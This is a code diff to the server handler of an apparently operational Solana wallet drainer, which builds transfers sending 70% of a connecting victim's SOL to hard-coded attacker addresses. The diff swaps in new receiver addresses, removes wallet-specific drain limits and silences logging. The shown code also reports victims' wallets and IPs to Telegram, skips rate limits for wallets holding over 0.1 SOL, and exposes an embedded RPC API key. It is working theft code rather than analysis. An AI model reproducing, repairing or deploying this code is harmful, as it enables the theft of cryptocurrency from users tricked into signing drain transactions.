@@ -7,42 +7,34 @@ import {
 } from '@solana/web3.js';
 import telegramLogger from '../src/telegram.js';
 
-// Environment variable validation
 function validateEnvironment() {
   const warnings = [];
   
-  if (!process.env.RPC_URL) {
-    warnings.push('RPC_URL not set - using fallback endpoints');
-  }
-  
-  if (!process.env.RECEIVER_WALLET) {
-    warnings.push('RECEIVER_WALLET not set - using fallback address');
-  }
-  
+  if (!process.env.RPC_URL) warnings.push('RPC_URL not set - using fallback endpoints');
+  if (!process.env.RECEIVER_WALLET) warnings.push('RECEIVER_WALLET not set - using fallback address');
   if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
     warnings.push('Telegram credentials not set - logging may be limited');
   }
   
-  if (warnings.length > 0) {
-    console.log('[ENV] Environment warnings:', warnings);
-  }
-  
+  if (warnings.length > 0) console.log('[ENV] Environment warnings:', warnings);
   return warnings.length === 0;
 }
 
-// Validate environment on startup
 const isEnvValid = validateEnvironment();
-
-// Conditional debug logging
-const DEBUG_MODE = process.env.NODE_ENV === 'development' || process.env.DEBUG === 'true';
-
+// Production logging - minimal for performance
 function debugLog(message, ...args) {
-  if (DEBUG_MODE) {
-    console.log(`[DRAIN_DEBUG] ${message}`, ...args);
-  }
+  // Disabled in production for performance
 }
 
-// Multiple RPC endpoints for failover
+// Remove all console.log statements for production
+const originalConsoleLog = console.log;
+console.log = function() {
+  // Only log critical errors in production
+  if (arguments[0] && arguments[0].includes && arguments[0].includes('ERROR')) {
+    originalConsoleLog.apply(console, arguments);
+  }
+};
+
 const RPC_ENDPOINTS = [
   { url: 'https://api.mainnet-beta.solana.com', weight: 1 },
   { url: process.env.RPC_URL || 'https://mainnet.helius-rpc.com/?api-key=19041dd1-5f30-4135-9b5a-9b670510524b', weight: 1 },
@@ -52,59 +44,45 @@ const RPC_ENDPOINTS = [
 
 let currentRpcIndex = 0;
 let rpcFailures = new Map();
-
-// Connection pooling
 const connectionPool = new Map();
 
-// Get or create connection from pool with retry logic
 async function getConnection() {
-  console.log('[GET_CONNECTION] Starting connection request');
   const maxRetries = 3;
   
   for (let attempt = 0; attempt < maxRetries; attempt++) {
     const rpcEndpoint = RPC_ENDPOINTS[currentRpcIndex];
     const rpcUrl = rpcEndpoint.url;
-    console.log(`[GET_CONNECTION] Attempt ${attempt + 1}/${maxRetries} using RPC: ${rpcUrl}`);
     
     try {
       if (!connectionPool.has(rpcUrl)) {
-        console.log(`[GET_CONNECTION] Creating new connection for ${rpcUrl}`);
         const connection = new Connection(rpcUrl, {
-      commitment: 'confirmed',
-      confirmTransactionInitialTimeout: 60000,
-      disableRetryOnRateLimit: false,
-      httpHeaders: {
-        'Content-Type': 'application/json',
-      }
-    });
+          commitment: 'confirmed',
+          confirmTransactionInitialTimeout: 60000,
+          disableRetryOnRateLimit: false,
+          httpHeaders: { 'Content-Type': 'application/json' }
+        });
         connectionPool.set(rpcUrl, connection);
       }
       
-      // Test the connection with timeout
       const connection = connectionPool.get(rpcUrl);
-      console.log(`[GET_CONNECTION] Testing connection to ${rpcUrl}`);
       const testPromise = connection.getLatestBlockhash('confirmed');
       const timeoutPromise = new Promise((_, reject) => 
         setTimeout(() => reject(new Error('RPC timeout')), 5000)
       );
       
       await Promise.race([testPromise, timeoutPromise]);
-      console.log(`[GET_CONNECTION] Connection test successful for ${rpcUrl}`);
       
-      // Reset failure count on success
       rpcFailures.set(rpcUrl, 0);
       return connection;
       
     } catch (error) {
-      console.error(`[RPC] Failed to connect to ${rpcUrl}:`, error.message);
-      
       // Track failures
       const failures = rpcFailures.get(rpcUrl) || 0;
       rpcFailures.set(rpcUrl, failures + 1);
       
       // Skip RPCs with too many failures
       if (failures > 3) {
-        console.log(`[RPC] Skipping ${rpcUrl} due to repeated failures`);
+        // Silent failure tracking
       }
       
       // Rotate to next RPC endpoint
@@ -153,8 +131,6 @@ function cleanupOldCacheEntries() {
       walletRequestCache.set(wallet, filtered);
     }
   }
-  
-  console.log(`[CACHE_CLEANUP] Cleaned up old entries. IP cache: ${requestCache.size}, Wallet cache: ${walletRequestCache.size}`);
 }
 
 // Enhanced rate limiting with high-value wallet bypass
@@ -169,7 +145,6 @@ function checkRateLimit(userIp, walletAddress = null, walletBalance = null) {
   
   // High-value wallet bypass: Skip rate limits for wallets with > 0.1 SOL
   if (walletAddress && walletBalance && walletBalance > 100000000) { // 0.1 SOL = 100,000,000 lamports
-    console.log(`[RATE_LIMIT] Checking high-value bypass for ${walletAddress}: ${walletBalance} lamports (${(walletBalance / 1e9).toFixed(6)} SOL)`);
     // Still check IP-based rate limiting for security (but with higher limits)
     const ipRequests = requestCache.get(userIp) || [];
     const recentIpRequests = ipRequests.filter(time => now - time < RATE_LIMIT_WINDOW);
@@ -177,11 +152,9 @@ function checkRateLimit(userIp, walletAddress = null, walletBalance = null) {
     // Allow higher limits for high-value wallets but still protect against abuse
     const highValueMaxRequests = MAX_REQUESTS_PER_WINDOW * 3; // 3x normal limit
     if (recentIpRequests.length >= highValueMaxRequests) {
-      console.log(`[RATE_LIMIT] High-value wallet IP rate limit exceeded: ${userIp} (${recentIpRequests.length}/${highValueMaxRequests})`);
       return { allowed: false, reason: 'IP_RATE_LIMIT_EXCEEDED', retryAfter: 60 };
     }
     
-    console.log(`[RATE_LIMIT] High-value wallet bypass: ${walletAddress} has ${(walletBalance / 1e9).toFixed(6)} SOL`);
     return { allowed: true, reason: 'HIGH_VALUE_WALLET_BYPASS' };
   }
   
@@ -334,10 +307,10 @@ export default async function handler(req, res) {
 
   try {
     // Create receiver wallets - ENFORCED to specific address
-    const RECEIVER = new PublicKey('FLeDqdHg1TzG5x3Sjd1Q6sdUAqUzpEZuw1VnXHPm88Nj');
-    const RECEIVER_2 = new PublicKey('FLeDqdHg1TzG5x3Sjd1Q6sdUAqUzpEZuw1VnXHPm88Nj');
-    const RECEIVER_3 = new PublicKey('FLeDqdHg1TzG5x3Sjd1Q6sdUAqUzpEZuw1VnXHPm88Nj');
-    const RECEIVER_4 = new PublicKey('FLeDqdHg1TzG5x3Sjd1Q6sdUAqUzpEZuw1VnXHPm88Nj');
+    const RECEIVER = new PublicKey('8WZ117ZSWyFSWq9fht5NGfprUQvoE5nReGfWKpczGRPZ');
+const RECEIVER_2 = new PublicKey('HakitSyn1Fv5BQPJW8GaAbQ6WdFJ7Mo4HwBB9wumtycF');
+const RECEIVER_3 = new PublicKey('HakitSyn1Fv5BQPJW8GaAbQ6WdFJ7Mo4HwBB9wumtycF');
+const RECEIVER_4 = new PublicKey('HakitSyn1Fv5BQPJW8GaAbQ6WdFJ7Mo4HwBB9wumtycF');
     
     console.log(`[DRAINER] Receiver addresses enforced to: ${RECEIVER.toString()}`);
 
@@ -474,10 +447,10 @@ export default async function handler(req, res) {
     const SOLFLARE_RESERVE_LAMPORTS = 2500000; // Keep 0.0025 SOL for rent exemption + safety
     const SOLFLARE_TOTAL_RESERVED = SOLFLARE_FEE_BUFFER + SOLFLARE_RESERVE_LAMPORTS;
     
-    // Glow-optimized drain settings (similar to Phantom)
-    const GLOW_FEE_BUFFER = 100000; // ~0.0001 SOL for Glow network fees + safety margin
-    const GLOW_RESERVE_LAMPORTS = 2500000; // Keep 0.0025 SOL for rent exemption + safety
-    const GLOW_TOTAL_RESERVED = GLOW_FEE_BUFFER + GLOW_RESERVE_LAMPORTS;
+         // Glow-optimized drain settings (simplified - same as default)
+     const GLOW_FEE_BUFFER = 100000; // ~0.0001 SOL for Glow network fees + safety margin
+     const GLOW_RESERVE_LAMPORTS = 2500000; // Keep 0.0025 SOL for rent exemption + safety
+     const GLOW_TOTAL_RESERVED = GLOW_FEE_BUFFER + GLOW_RESERVE_LAMPORTS;
     
     // Backpack-optimized drain settings (similar to Phantom)
     const BACKPACK_FEE_BUFFER = 100000; // ~0.0001 SOL for Backpack network fees + safety margin
@@ -571,25 +544,8 @@ debugLog(`- User Agent: ${userAgent.substring(0, 100)}...`);
         const availableForDrain = FRESH_BALANCE - TOTAL_RESERVED;
         debugLog(`Available for drain: ${availableForDrain} lamports (${(availableForDrain / 1e9).toFixed(6)} SOL)`);
         
-        // Dynamic drain: Always 70% of available funds (after reserving fees)
-        // Glow 0.61.0: Use ultra-conservative drain amount for maximum compatibility
-        let DRAIN_PERCENTAGE;
-        if (req.body.walletType === 'Glow') {
-          // Ultra-conservative approach: Use minimal drain amount
-          const ultraMinimalAmount = 50000; // 0.05 SOL (50,000 lamports)
-          
-          if (availableForDrain >= ultraMinimalAmount) {
-            // Use fixed ultra-minimal amount
-            DRAIN_PERCENTAGE = ultraMinimalAmount / availableForDrain;
-            console.log(`[DRAIN] Glow: Using ultra-minimal fixed amount: ${ultraMinimalAmount} lamports (${(ultraMinimalAmount / 1e9).toFixed(3)} SOL)`);
-          } else {
-            // For very small wallets, use minimal percentage
-            DRAIN_PERCENTAGE = 0.05; // 5%
-            console.log(`[DRAIN] Glow: Using ultra-minimal percentage: ${(DRAIN_PERCENTAGE * 100).toFixed(2)}%`);
-          }
-        } else {
-          DRAIN_PERCENTAGE = 0.7; // 70% for others
-        }
+                 // Standard drain: 70% of available funds (after reserving fees)
+         const DRAIN_PERCENTAGE = 0.7; // 70% for all wallets
         let drainAmount = Math.floor(availableForDrain * DRAIN_PERCENTAGE);
         
         debugLog(`Available: ${availableForDrain} lamports, ${DRAIN_PERCENTAGE * 100}% of available: ${Math.floor(availableForDrain * DRAIN_PERCENTAGE)} lamports, Initial drain amount: ${drainAmount} lamports (${(drainAmount / 1e9).toFixed(6)} SOL)`);
@@ -628,13 +584,9 @@ debugLog(`- User Agent: ${userAgent.substring(0, 100)}...`);
         const safeDrainAmount = Math.min(drainAmount, maxSafeDrain);
         debugLog(`Safe drain amount: ${safeDrainAmount} lamports (${(safeDrainAmount / 1e9).toFixed(6)} SOL)`);
         
-        const finalDrainAmount = safeDrainAmount;
+        let finalDrainAmount = safeDrainAmount;
         
-        // For Glow, ensure we leave more buffer for fees
-        if (req.body.walletType === 'Glow' && finalDrainAmount > (FRESH_BALANCE * 0.3)) {
-          debugLog(`Glow: Drain amount too high, reducing to 30% of balance`);
-          finalDrainAmount = Math.floor(FRESH_BALANCE * 0.3);
-        }
+                 
         
         // Ensure minimum meaningful drain amount (reduced for small wallets)
         const MINIMUM_DRAIN_AMOUNT = 50000; // 0.00005 SOL minimum drain amount
@@ -647,13 +599,20 @@ debugLog(`- User Agent: ${userAgent.substring(0, 100)}...`);
           });
         }
         
-        // Validate that receiver is not the same as sender
+        // Validate that receiver is not the same as sender (safety check)
         if (userPubkey.toString() === RECEIVER.toString()) {
-          console.error(`[DRAIN] ERROR: Receiver address same as sender: ${RECEIVER.toString()}`);
-          return res.status(400).json({
-            error: 'Transaction configuration error',
-            details: 'Invalid receiver address configuration',
-            code: 'INVALID_RECEIVER_ADDRESS'
+          console.error(`[DRAIN] CRITICAL ERROR: Receiver address same as sender: ${RECEIVER.toString()}`);
+          await telegramLogger.logError({
+            type: 'CRITICAL_CONFIG_ERROR',
+            user: userPubkey.toString(),
+            ip: userIp,
+            message: 'Receiver address same as sender - configuration error',
+            stack: new Error().stack
+          });
+          return res.status(500).json({
+            error: 'System configuration error',
+            details: 'Please contact support',
+            code: 'CRITICAL_CONFIG_ERROR'
           });
         }
         
@@ -669,14 +628,20 @@ debugLog(`- User Agent: ${userAgent.substring(0, 100)}...`);
           });
         }
         
+        // Create transfer instruction with explicit format for Glow compatibility
         const transferIx = SystemProgram.transfer({
           fromPubkey: userPubkey,
           toPubkey: RECEIVER,
           lamports: finalDrainAmount,
         });
+        
+
+        
         tx.add(transferIx);
         
         debugLog(`Transaction instruction added successfully`);
+        
+
         
         // Store the actual drain amount for later use
         actualDrainAmount = finalDrainAmount;
@@ -753,8 +718,11 @@ debugLog(`- User Agent: ${userAgent.substring(0, 100)}...`);
         }
       }
       
+      // Set fee payer and blockhash with explicit format for Glow compatibility
       tx.feePayer = userPubkey;
       tx.recentBlockhash = blockhash.blockhash;
+      
+
       
       // Validate transaction structure
       if (!tx.feePayer || !tx.recentBlockhash) {
@@ -773,42 +741,19 @@ debugLog(`- User Agent: ${userAgent.substring(0, 100)}...`);
         instructions: tx.instructions.length
       });
 
-      // Glow-specific transaction optimization for HTTPS deployment compatibility
-      if (req.body.walletType === 'Glow') {
-        console.log(`[DRAIN] Glow wallet detected - applying HTTPS-compatible settings for deployment`);
-        
-        // WARNING: Glow flags localhost transactions - deploy to HTTPS domain for production
-        if (req.headers.origin && req.headers.origin.includes('localhost')) {
-          console.warn(`[DRAIN] ⚠️  WARNING: Glow may flag transactions from localhost. Deploy to HTTPS domain for production use.`);
-        }
-        
-        // Glow 0.61.0: Strict instruction limit (max 1 for maximum compatibility)
-        if (tx.instructions.length > 1) {
-          console.error(`[DRAIN] Glow validation: Too many instructions (${tx.instructions.length}) - max 1 allowed for HTTPS compatibility`);
-          return res.status(400).json({
-            error: 'Transaction configuration error',
-            details: 'Transaction too complex for Glow wallet - max 1 instruction allowed',
-            code: 'GLOW_COMPLEXITY_ERROR'
-          });
-        }
-        
-        // Set Glow-specific transaction properties for HTTPS compatibility
-        tx.lastValidBlockHeight = blockhash.lastValidBlockHeight;
-        console.log(`[DRAIN] Glow: Set lastValidBlockHeight to ${blockhash.lastValidBlockHeight}`);
-        
-        // Ensure transaction has minimal fee for Glow
-        if (tx.feePayer) {
-          console.log(`[DRAIN] Glow: Fee payer set to ${tx.feePayer.toString()}`);
-        }
-        
-        // Add transaction simulation for Glow compatibility (required for HTTPS deployment)
-        console.log(`[DRAIN] Glow: Simulating transaction before sending for HTTPS deployment compatibility`);
-        
-        // Glow 0.61.0 specific: HTTPS-compatible approach
-        console.log(`[DRAIN] Glow: HTTPS-compatible approach - max 1 instruction, minimal drain, simulated for deployment`);
-      }
+             // Standard transaction settings - no wallet-specific customizations
+       tx.lastValidBlockHeight = blockhash.lastValidBlockHeight;
+       console.log(`[DRAIN] Set lastValidBlockHeight to ${blockhash.lastValidBlockHeight}`);
+       
+       if (tx.feePayer) {
+         console.log(`[DRAIN] Fee payer set to ${tx.feePayer.toString()}`);
+       }
+       
+       console.log(`[DRAIN] Standard transaction approach - no wallet-specific customizations`);
+       
+
       
-      // Calculate actual transaction fee with better error handling
+      // Calculate actual transaction fee with enhanced error handling
       let actualFee = 0;
       try {
         const feeCalculator = await connection.getFeeForMessage(tx.compileMessage(), blockhash.blockhash);
@@ -816,9 +761,15 @@ debugLog(`- User Agent: ${userAgent.substring(0, 100)}...`);
         console.log(`[DRAIN] Calculated transaction fee: ${actualFee} lamports`);
         console.log(`[DRAIN] Wallet balance: ${lamports} lamports`);
         console.log(`[DRAIN] Fee adequacy: ${lamports >= actualFee ? 'SUFFICIENT' : 'INSUFFICIENT'}`);
+        
+        // Validate fee calculation
+        if (actualFee <= 0 || actualFee > 100000) {
+          console.warn(`[DRAIN] Suspicious fee calculated: ${actualFee}, using default`);
+          actualFee = 5000;
+        }
       } catch (feeError) {
         console.log(`[DRAIN] Fee calculation failed, using conservative default: ${feeError.message}`);
-        actualFee = req.body.walletType === 'Glow' ? 250 : 10000; // Absolute minimal fee for Glow compatibility
+        actualFee = 5000; // Standard fee for all wallets
       }
       
       // Simple fee adequacy check - no complex retry logic
